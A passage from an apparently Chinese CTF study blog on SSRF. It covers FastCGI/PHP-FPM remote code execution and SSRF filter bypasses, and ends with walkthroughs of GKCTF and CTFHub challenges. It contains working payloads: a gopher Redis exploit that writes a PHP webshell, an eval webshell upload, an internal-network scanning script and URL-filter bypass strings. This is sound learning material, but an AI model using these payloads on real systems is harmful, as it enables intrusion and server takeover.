解释器进程，<strong>通过 FastCGI 协议发送 CGI 环境变量和标准输入数据给 这个CGI 解释器进程</strong></li><li>CGI 解释器进程完成处理后将<strong>标准输出和错误信息从同一连接返回 Web 服务器</strong></li><li>CGI 解释器进程接着等待并处理来自 Web 服务器的下一个连接</li></ol><p>由此，<strong>PHP-FPM 就是一个FastCGI进程管理器，是对于 FastCGI 协议的具体实现</strong>，它负责管理一个进程池，来处理来自Web服务器的请求。</p><h4 id="PHP-FPM通信方式"><a href="#PHP-FPM通信方式" class="headerlink" title="PHP-FPM通信方式"></a>PHP-FPM通信方式</h4><p>在PHP使用FastCGI连接模式的情况下，Web服务器中间件如Nginx和PHP-FPM之间的通信方式又分为两种，<strong>TCP模式和套接字(unix socket)模式</strong></p><ul><li><strong>TCP模式</strong>即是PHP-FPM进程会监听本机上的一个端口（默认为9000），然后Nginx会把客户端请求数据通过FastCGI协议传给9000端口，PHP-FPM拿到数据后会调用CGI进程解析</li><li><strong>Unix套接字模式</strong>是Unix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了。上述原理图中提到的<strong>Socket 通信</strong>即为此模式</li></ul><p>ssrf中对FastCGI的攻击是利用了TCP模式</p><h3 id="FastCGI攻击"><a href="#FastCGI攻击" class="headerlink" title="FastCGI攻击"></a>FastCGI攻击</h3><h4 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h4><p>HTTP协议是浏览器和服务器中间件进行数据交换的协议，类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端（如PHP-FPM）进行数据交换的协议</p><p>Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端（PHP-FPM），语言后端（PHP-FPM）解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件</p><p>record的头固定8个字节，body是由头中的contentLength指定，其结构如下：</p><pre class="language-none"><code class="language-none">typedef struct &#123;  &#x2F;* Header *&#x2F;  unsigned char version; &#x2F;&#x2F; 版本  unsigned char type; &#x2F;&#x2F; 本次record的类型  unsigned char requestIdB1; &#x2F;&#x2F; 本次record对应的请求id  unsigned char requestIdB0;  unsigned char contentLengthB1; &#x2F;&#x2F; body体的大小  unsigned char contentLengthB0;  unsigned char paddingLength; &#x2F;&#x2F; 额外块大小  unsigned char reserved;   &#x2F;* Body *&#x2F;  unsigned char contentData[contentLength];  unsigned char paddingData[paddingLength];&#125; FCGI_Record;</code></pre><blockquote><p>语言端（PHP-FPM）解析了fastcgi头以后，拿到<code>contentLength</code><br>，然后再在TCP流里读取大小等于<code>contentLength</code><br>的数据，这就是body体</p><p>Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用  不需要该Padding的时候，将其长度设置为0即可</p><p>可见，一个fastcgi record结构最大支持的body大小是<code>2^16</code></p><p>，也就是65536字节</p></blockquote><p>其中，header中的<code>type</code><br>代表本次record的类型，所有值及具体含义如下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429194926645.png" alt="image-20220429194926645"></p><p>服务器中间件和后端语言通信，第一个数据包就是<code>type</code>为1的record，后续互相交流，发送<code>type</code>为4、5、6、7的record，结束时发送<code>type</code>为2、3的record。</p><p>这里着重讲一下type为4，当后端语言接收到一个 <code>type</code> 为4的 Record 后，就会把这个 Record 的 Body 按照对应的结构解析成 key-value 对，结构如下：</p><pre class="language-none"><code class="language-none">typedef struct &#123;  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;  unsigned char nameData[nameLength];  unsigned char valueData[valueLength];&#125; FCGI_NameValuePair11;typedef struct &#123;  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;  unsigned char valueLengthB2;  unsigned char valueLengthB1;  unsigned char valueLengthB0;  unsigned char nameData[nameLength];  unsigned char valueData[valueLength          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];&#125; FCGI_NameValuePair14;typedef struct &#123;  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;  unsigned char nameLengthB2;  unsigned char nameLengthB1;  unsigned char nameLengthB0;  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;  unsigned char nameData[nameLength          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];  unsigned char valueData[valueLength];&#125; FCGI_NameValuePair41;typedef struct &#123;  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;  unsigned char nameLengthB2;  unsigned char nameLengthB1;  unsigned char nameLengthB0;  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;  unsigned char valueLengthB2;  unsigned char valueLengthB1;  unsigned char valueLengthB0;  unsigned char nameData[nameLength          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];  unsigned char valueData[valueLength          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];&#125; FCGI_NameValuePair44;</code></pre><p>这其实是 4 个结构，至于用哪个结构，有如下规则：</p><ol><li>key、value均小于128字节，用 <code>FCGI_NameValuePair11</code></li><li>key大于128字节，value小于128字节，用 <code>FCGI_NameValuePair41</code></li><li>key小于128字节，value大于128字节，用 <code>FCGI_NameValuePair14</code></li><li>key、value均大于128字节，用 <code>FCGI_NameValuePair44</code></li></ol><p>举个例子，用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code><br>如果web目录是<code>/var/www/html</code><br>那么服务器中间件（Nginx）会将这个请求变成如下key-value对：</p><pre class="language-none"><code class="language-none">&#123;    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,    &#39;SERVER_PORT&#39;: &#39;80&#39;,    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;&#125;</code></pre><p>这个数组其实就是PHP中<code>$_SERVER</code><br>数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充<code>$_SERVER</code><br>数组，也是告诉FPM：“我要执行哪个PHP文件”</p><p>当后端语言（PHP-FPM）拿到由Nginx发过来的FastCGI数据包后，进行解析，得到上述这些环境变量。然后，<strong>执行<code>SCRIPT_FILENAME</code><br>的值指向的PHP文件，也就是<code>/var/www/html/index.php</code></strong></p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p><strong>PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造FastCGI协议，和FPM进行通信</strong>。</p><p>所以我们如果能够自行构造SCRIPT_FILENAME的值，就能控制PHP-FPM执行任意后缀文件，如<code>/etc/passwd</code></p><p>但是，在PHP5.3.9之后，FPM默认配置中增加了<code>security.limit_extensions</code>选项</p><pre class="language-none"><code class="language-none">; Limits the extensions of the main script FPM will allow to parse. This can; prevent configuration mistakes on the web server side. You should only limit; FPM to .php extensions to prevent malicious users to use other extensions to; exectute php code.; Note: set an empty value to allow all extensions.; Default Value: .php;security.limit_extensions &#x3D; .php .php3 .php4 .php5 .php7</code></pre><p>限制了只有.php后缀的文件才能够被FPM执行</p><p>因此，想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。已存在的PHP文件名获得有两种方法：</p><ul><li>通过系统的信息收集、爆破、报错获得某个PHP文件名及其路径</li><li>找安装PHP后默认存在的PHP文件，如<code>/usr/local/lib/php/PEAR.php</code></li></ul><p>现在，拿到了文件名，我们<strong>能控制<code>SCRIPT_FILENAME</code><br>，却只能执行目标服务器上的文件，并不能执行我们想要执行的任意代码，但我们可以通过构造<code>type</code><br>值为4的record，也就是设置向PHP-FPM传递的环境变量来达到任意代码执行的目的</strong></p><blockquote><p>在PHP.INI中有两个配置项，<code>auto_prepend_file</code>和<code>auto_append_file</code>。</p><p><code>auto_prepend_file</code>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件；</p><p><code>auto_append_file</code>是告诉PHP，在执行完成目标文件后，包含<code>auto_append_file</code>指向的文件。</p></blockquote><p>若我们设置<code>auto_prepend_file</code>为<code>php://input</code>（<code>allow_url_include=on</code>），那么就等于在执行任何PHP文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在FastCGI协议 Body中，它们就能被执行了</p><p>而这就要利用后端语言（PHP-FPM）拿到由Nginx发过来的FastCGI数据包后，进行解析，得到的环境变量了。</p><p>在其中有PHP_VALUE和PHP_ADMIN_VALUE两个特殊的值</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/modb_20211112_39f986d6-43ac-11ec-a089-fa163eb4f6be.png" alt="img"></p><p>所以我们只要将环境变量构造成</p><pre class="language-none"><code class="language-none">&#123;    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,    &#39;SERVER_PORT&#39;: &#39;80&#39;,    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;    &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,    &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;&#125;</code></pre><p>就能实现rce的目的</p><p>ctf中一般的利用条件</p><ul><li>PHP版本要高于5.3.3，才能动态修改PHP.INI配置文件</li><li>知道题目环境中的一个PHP文件的绝对路径</li><li>PHP-FPM监听在本机9000端口</li></ul><p>例题参考</p><p><a href="https://ethe448.github.io/2022/05/12/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9%E5%A4%8D%E7%8E%B0/#toc-heading-5">陇原战役复现 | Ethe&#39;s blog (ethe448.github.io)</a></p><h1 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h1><p>对于SSRF的限制大致有如下几种：</p><ul><li>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。</li><li>限制域名只能为<a href="http://www.xxx.com/">http://www.xxx.com</a></li><li>限制不能访问内网的IP，以防止对内网进行攻击。</li><li>屏蔽返回的详细信息。</li></ul><h3 id="利用HTTP基本身份认证的方式绕过"><a href="#利用HTTP基本身份认证的方式绕过" class="headerlink" title="利用HTTP基本身份认证的方式绕过"></a>利用HTTP基本身份认证的方式绕过</h3><p>如果目标代码限制访问的域名只能为 <a href="http://www.xxx.com/">http://www.xxx.com</a> ，那么我们可以采用HTTP基本身份认证的方式绕过。即@：<a href="http://www.xxx.com@www.evil.com/">http://www.xxx.com@www.evil.com</a></p><h3 id="本地回环地址的其他表现形式"><a href="#本地回环地址的其他表现形式" class="headerlink" title="本地回环地址的其他表现形式"></a>本地回环地址的其他表现形式</h3><p><strong>127.0.0.1</strong>，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加[])：</p><p><a href="http://127.0.0.1/">http://127.0.0.1</a><br><a href="http://localhost/">http://localhost</a><br><a href="http://127.255.255.254/">http://127.255.255.254</a><br>127.0.0.1 - 127.255.255.254<br>http://[::1]<br>http://[::ffff:7f00:1]<br>http://[::ffff:127.0.0.1]<br><a href="http://127.0.0.1/">http://127.1</a><br><a href="http://127.0.0.1/">http://127.0.1</a><br><a href="http://0.0.0.0/">http://0:80</a></p><h3 id="IP的进制转换"><a href="#IP的进制转换" class="headerlink" title="IP的进制转换"></a>IP的进制转换</h3><p>IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。使用如win系统自带的计算机（程序员模式）就可简单实现IP地址的进制转换。</p><p>由于一些系统会直接提取邮件中内嵌的链接进行检测，而一种此类URL混淆技术采用了URL主机名部分中使用的编码十六进制IP地址格式来逃避检测。</p><p>由于IP地址可以用多种格式表示，因此可以在URL中如下所示使用：</p><ul><li>点分十进制IP地址：<a href="http://127.0.0.1/">http://127.0.0.1</a></li><li>八进制IP地址：<a href="http://0177.0.0.1(将每个十进制数字转换为八进制)/">http://0177.0.0.1（将每个十进制数字转换为八进制）</a></li><li>十六进制IP地址：<a href="http://0x7f000001或者http//0x7F.0.0.1%EF%BC%88%E5%B0%86%E6%AF%8F%E4%B8%AA%E5%8D%81%E8%BF%9B%E5%88%B6%E6%95%B0%E5%AD%97%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%EF%BC%89">http://0x7F000001或者http://0x7F.0.0.1（将每个十进制数字转换为十六进制）</a></li><li>整数或DWORD IP地址：<a href="http://2130706433(将十六进制ip转换为整数)/">http://2130706433（将十六进制IP转换为整数）</a></li></ul><p>白嫖个脚本</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$ip &#x3D; &#39;127.0.0.1&#39;;$ip &#x3D; explode(&#39;.&#39;,$ip);$r &#x3D; ($ip[0] &lt;&lt; 24) | ($ip[1] &lt;&lt; 16) | ($ip[2] &lt;&lt; 8) | $ip[3] ;if($r &lt; 0) &#123;    $r +&#x3D; 4294967296;&#125;echo &quot;十进制:&quot;;     &#x2F;&#x2F; 2130706433echo $r;echo &quot;八进制:&quot;;     &#x2F;&#x2F; 0177.0.0.1echo decoct($r);echo &quot;十六进制:&quot;;   &#x2F;&#x2F; 0x7f.0.0.1echo dechex($r);?&gt;</code></pre><h3 id="利用302跳转绕过内网IP"><a href="#利用302跳转绕过内网IP" class="headerlink" title="利用302跳转绕过内网IP"></a>利用302跳转绕过内网IP</h3><p>网络上存在一个很神奇的服务，网址为 <a href="http://xip.io/">http://xip.io</a>，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：</p><p>当我们访问：<a href="http://127.0.0.1.xip.io/flag.php">http://127.0.0.1.xip.io/flag.php</a> 时，实际上访问的是<a href="http://127.0.0.1/1.php">http://127.0.0.1/1.php</a> 。像这种网址还有<a href="http://nip.io,http//sslip.io">http://nip.io，http://sslip.io</a> 。</p><p>这个我在自己的服务器上没试成功，不知道为什么</p><h3 id="短地址跳转绕过"><a href="#短地址跳转绕过" class="headerlink" title="短地址跳转绕过"></a>短地址跳转绕过</h3><p>将连接变为短链接</p><p>比如这种</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427205506703.png" alt="image-20220427205506703"></p><p>宝塔方便是方便。。。但是复现漏洞的时候也太安全了，全给拦了。。。。</p><h3 id="利用不存在的协议头绕过指定的协议头"><a href="#利用不存在的协议头绕过指定的协议头" class="headerlink" title="利用不存在的协议头绕过指定的协议头"></a>利用不存在的协议头绕过指定的协议头</h3><p><code>file_get_contents()</code>函数的一个特性，即当PHP的 <code>file_get_contents()</code> 函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427212221005.png" alt="image-20220427212221005"></p><h3 id="利用URL的解析问题"><a href="#利用URL的解析问题" class="headerlink" title="利用URL的解析问题"></a>利用URL的解析问题</h3><p>可以用<code>0.0.0.0</code>绕过对内网ip的检测， 这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址，使用如下即可绕过：</p><h3 id="利用readfile和parse-url函数的解析差异绕过指定的端口"><a href="#利用readfile和parse-url函数的解析差异绕过指定的端口" class="headerlink" title="利用readfile和parse_url函数的解析差异绕过指定的端口"></a>利用readfile和parse_url函数的解析差异绕过指定的端口</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427212755037.png" alt="image-20220427212755037"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427212822648.png" alt="image-20220427212822648"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h1><p><a href="https://blog.csdn.net/qq_61237064/article/details/123006424">(4条消息) 用SSRF打穿内网_ZredamanJ的博客-CSDN博客</a></p><p><a href="https://www.jianshu.com/p/a5ceccfa279a">https://www.jianshu.com/p/a5ceccfa279a</a></p><p><a href="https://zhuanlan.zhihu.com/p/115222529">https://zhuanlan.zhihu.com/p/115222529</a></p><p><a href="https://blog.csdn.net/qq_43665434/article/details/115434528">https://blog.csdn.net/qq_43665434/article/details/115434528</a></p><p><a href="https://baijiahao.baidu.com/s?id=1724265374498292807&wfr=spider&for=pc">铭说｜关于SSRF和多种绕过方式 (baidu.com)</a></p><p><a href="https://blog.csdn.net/qq_41107295/article/details/103026470">(4条消息) SSRF利用 Gopher 协议拓展攻击面_BerL1n的博客-CSDN博客_gopherus使用</a></p><p><a href="https://blog.csdn.net/qq_38154820/article/details/109252839">(4条消息) 浅谈ssrf与ctf那些事_合天网安实验室的博客-CSDN博客_ctfssrf</a></p><p><a href="https://blog.csdn.net/bylfsj/article/details/105083164">(4条消息) SSRF in PHP_bylfsj的博客-CSDN博客</a></p><p>赵总这个新利用方法先放一下</p><p><a href="https://www.zhaoj.in/read-6681.html#_SSRF">基于 A 和 AAAA 记录的一种新 DNS Rebinding 姿势–从西湖论剑2020 Web HelloDiscuzQ 题对 Blackhat 上的议题做升华 – glzjin (zhaoj.in)</a></p><p>已经超过我的基础知识了</p><p>小tips：</p><p>SSRF一般是先想办法得到目标主机的网络配置信息，如读取/etc/hosts、/proc/net/arp、/proc/net/fib_trie(存放网络适配器地址)，从而获得目标主机的内网网段并进行爆破，后面两个所需要的权限高一点，可以用file协议读一下</p><p><a href="https://www.cnblogs.com/Yang34/p/13914297.html">Linux中proc信息获取 - Yangsir34 - 博客园 (cnblogs.com)</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h3 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h3><p>输入<a href="http://www.baidu.com会出现的百度的页面/">www.baidu.com会出现的百度的页面</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426183847852.png" alt="image-20220426183847852"></p><p>然后加一个源码里提示的secret参数，能找到这台主机的网卡配置信息，得到内网ip 10.244.80.251而且输入框内后</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426184108287.png" alt="image-20220426184108287"></p><p>所以我们可以尝试利用ssrf来得到在内网其他机器上的flag</p><p>可以用file协议看看源码</p><p>过滤了file://，可以使用file:/,file: ///,file:_///绕过</p><pre class="language-none"><code class="language-none">file: &#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</code></pre><pre class="language-none"><code class="language-none">&lt;?phpfunction curl($url)&#123;      $ch &#x3D; curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_HEADER, 0);    echo curl_exec($ch);    curl_close($ch);&#125;if(isset($_GET[&#39;submit&#39;]))&#123;$url &#x3D; $_GET[&#39;url&#39;];&#x2F;&#x2F;echo $url.&quot;\n&quot;;if(preg_match(&#39;&#x2F;file\:\&#x2F;\&#x2F;|dict|\.\.\&#x2F;|127.0.0.1|localhost&#x2F;is&#39;, $url,$match))&#123;&#x2F;&#x2F;var_dump($match);die(&#39;别这样&#39;);&#125;curl($url);&#125;if(isset($_GET[&#39;secret&#39;]))&#123;system(&#39;ifconfig&#39;);&#125;?&gt;</code></pre><p>bp不知道为什么寄了，扫不了这个，只能上python了</p><pre class="language-none"><code class="language-none">import requestsa &#x3D; []url &#x3D; &quot;http:&#x2F;&#x2F;4a20197b-aba4-4baa-ac34-21588a8ab47b.node4.buuoj.cn:81&#x2F;index.php?url&#x3D;10.244.80.&#123;&#125;&amp;submit&#x3D;%E6%8F%90%E4%BA%A4&quot;for i in range(0,255):    print(i)    url1 &#x3D; url.format(i)    print(url1)    try:        r &#x3D; requests.get(url1,timeout&#x3D;1)        print(r.text)        a.append(i)        continue    except Exception as e:        print(&#39;timeout&#39;)print(a)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426181836817.png" alt="image-20220426181836817"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426184230846.png" alt="image-20220426184230846"></p><p>根据提示找找端口，再测一下发现有6379端口</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426182507562.png" alt="image-20220426182507562"></p><p>说明开启着redis服务</p><p>gopherus生成个payload</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426183028161.png" alt="image-20220426183028161"></p><p>改一下ip</p><pre class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;10.244.80.69:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%27cat%20&#x2F;flag%27%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code></pre><p>打进去之后访问一下shell.php</p><p>(这里如果直接把payload接在url的参数上需要再进行一次url编码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426183648401.png" alt="image-20220426183648401"></p><h2 id="CTFHUB-SSRF"><a href="#CTFHUB-SSRF" class="headerlink" title="CTFHUB SSRF"></a>CTFHUB SSRF</h2><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>确定存在ssrf</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428204537390.png" alt="image-20220428204537390"></p><p>题目说了flag在127.0.0.1的flag.php里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428204620736.png" alt="image-20220428204620736"></p><h3 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h3><p>利用file协议读取文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428215911402.png" alt="image-20220428215911402"></p><p>用绝对路径</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428220025771.png" alt="image-20220428220025771"></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428221558974.png" alt="image-20220428221558974"></p><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>要求就是给127.0.0.1的flag.php传个post参数key，key值在源码的注释里</p><p>gopher的url解码还挺玄幻的</p><p>试了几个小时，好几个网站的编码还有python和php自带的url编码的函数，但是都有点问题，最后就只有这两种成功了</p><pre class="language-txt" data-language="txt"><code class="language-txt">http:&#x2F;&#x2F;challenge-0334eacc0c1b7b0d.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D21c12d709c44fe44f99ee5ba47501882http:&#x2F;&#x2F;challenge-351296691c42d118.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;127.0.01:80&#x2F;_POST%2520%2Fflag.php%2520HTTP%2F1.1%250d%250AHost%3A127.0.0.1%250d%250AContent-Type%3Aapplication%2Fx-www-form-urlencoded%250d%250AContent-Length%3A36%250d%250A%250d%250Akey%3D646e343c70a1b9d07661c4343b0e5e72%250d%250A</code></pre><p>第一个是对</p><pre class="language-none"><code class="language-none">POST &#x2F;flag.php HTTP&#x2F;1.1Host:127.0.0.1Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 36key&#x3D;646e343c70a1b9d07661c4343b0e5e72</code></pre><p>用谷歌的hackbar上的自带的url编码进行一次编码，将换行符%0A换为%0D%0A，然后再编码一次</p><p>第二个是直接改之前测试post的时候的值</p><pre class="language-none"><code class="language-none">curl gopher:&#x2F;&#x2F;ip:80&#x2F;_POST%20&#x2F;ssrf&#x2F;test&#x2F;test.php%20HTTP&#x2F;1.1%0d%0AHost:ip%0d%0AContent-Type:application&#x2F;x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname&#x3D;Margin%0d%0A</code></pre><p>然后再用谷歌的hackbar进行一次编码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429113209009.png" alt="image-20220429113209009"></p><h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>和post差不多吗，但是要传的是文件，所以改一下前端页面，加个提交按钮，抓包</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429160323521.png" alt="image-20220429160323521"></p><p>然后直接把整个请求包改了host之后去url编码一次</p><pre class="language-none"><code class="language-none">POST &#x2F;flag.php HTTP&#x2F;1.1Host: 127.0.0.1:80Content-Length: 308Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1Origin: http:&#x2F;&#x2F;challenge-abdf75c2760a97e9.sandbox.ctfhub.com:10800Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryXT85fz2P3lDnY3AwUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;100.0.4896.127 Safari&#x2F;537.36 Edg&#x2F;100.0.1185.50Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;challenge-abdf75c2760a97e9.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;127.0.0.1&#x2F;flag.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6Connection: close------WebKitFormBoundaryXT85fz2P3lDnY3AwContent-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.pdf&quot;Content-Type: application&#x2F;pdf&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;------WebKitFormBoundaryXT85fz2P3lDnY3AwContent-Disposition: form-data; name&#x3D;&quot;file&quot;æäº¤------WebKitFormBoundaryXT85fz2P3lDnY3Aw--</code></pre><p>然后再将%0a变为%0d%0a，然后再编码一次</p><p>最终payload</p><pre 